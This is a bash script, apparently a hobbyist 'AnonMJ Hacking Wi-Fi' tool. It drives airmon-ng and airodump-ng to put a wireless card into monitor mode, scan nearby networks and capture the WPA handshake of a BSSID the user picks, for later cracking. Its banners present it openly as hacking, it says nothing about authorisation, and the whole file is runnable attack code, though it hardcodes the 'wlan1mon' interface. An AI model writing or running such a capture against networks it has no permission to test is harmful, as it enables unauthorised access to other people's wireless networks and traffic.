#! /bin/bash
echo "##############################################################################################################################################################################################################"
echo "---------------------------------------AnonMJ Hacking Wi-Fi---------------------------------------------------------------------------------------------------------------------------------------------------"
echo "##############################################################################################################################################################################################################"
echo "----------------------------------------Checking Interface----------------------------------------------------------------------------------------------------------------------------------------------------"
airmon-ng
sleep 1
read -p "Enter the Interface To Capture The Handshake = " Interface
 
echo "-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
echo "-----------------------------------------Checking airmon-ng--------------------------------------------------------------------------------------------------------------------------------------------------"
sleep 1
airmon-ng check $Interface
echo "#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
echo "#-----------------------------Starting Monitor Mode on Entered Interface-------------------------------------------------------------------------------------------------------------------------------------"
sleep 2
airmon-ng start $Interface
echo "##############################################################################################################################################################################################################"
echo "##############################################################################################################################################################################################################" 
airodump-ng wlan1mon -c 1,6,11,13
#taking input from user
read -p  "Enter The Bssid Of The Network = " Bssid
sleep 1
echo "##############################################################################################################################################################################################################"
#echo "Bssid = $Bssid"
echo "##############################################################################################################################################################################################################"
read -p  "Enter The Channel No Of $Bssid = " Chno
sleep 1
#read Chno
#echo "Channel No Of $Bssid :- $Chno"
echo "##############################################################################################################################################################################################################"
read -p "Enter The Name For The Handshake File = " Path
sleep 1
echo "##############################################################################################################################################################################################################"
#read Path 
sleep 2
echo "##############################################################################################################################################################################################################"
echo "-------------------------------------Cool Time to start Hacking-----------------------------------------------------------------------------------------------------------------------------------------------"
echo "##############################################################################################################################################################################################################"
#executing airodump-ng command
sleep 2
echo "##############################################################################################################################################################################################################"
echo "------------------------Executing airodump-ng cmd To Capture Handshake Of The $Bssid--------------------------------------------------------------------------------------------------------------------------"
sleep 1
echo "##############################################################################################################################################################################################################"
airodump-ng -i wlan1mon --bssid $Bssid -c $Chno -w $Path 
